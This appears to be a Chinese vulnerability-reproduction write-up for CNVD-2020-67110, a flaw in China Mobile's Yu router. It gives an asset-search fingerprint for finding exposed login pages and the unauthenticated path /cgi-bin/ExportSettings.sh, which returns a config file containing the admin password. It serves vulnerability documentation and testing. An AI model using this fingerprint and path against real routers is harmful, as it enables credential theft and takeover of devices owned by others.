---
title: "中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞 CNVD-2020-67110"
date: 2026-10-18 09:15:40
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "中国移动"
tags:
  - "中国移动"
  - "信息泄露"
  - "CNVD-2020-67110"
  - "漏洞复现"
---
## 漏洞描述

中国移动 禹路由 ExportSettings.sh 存在敏感信息泄露漏洞，攻击者通过漏洞获取配置文件，其中包含账号密码等敏感信息

## 漏洞影响

```
中国移动 禹路由
```

## 网络测绘

```
title="互联世界 物联未来-登录"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162254794.png)

访问Url

```plain
/cgi-bin/ExportSettings.sh
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162254659.png)

其中password为登录后台密码

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8-%E7%A6%B9%E8%B7%AF%E7%94%B1-ExportSettings.sh-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CNVD-2020-67110.md)
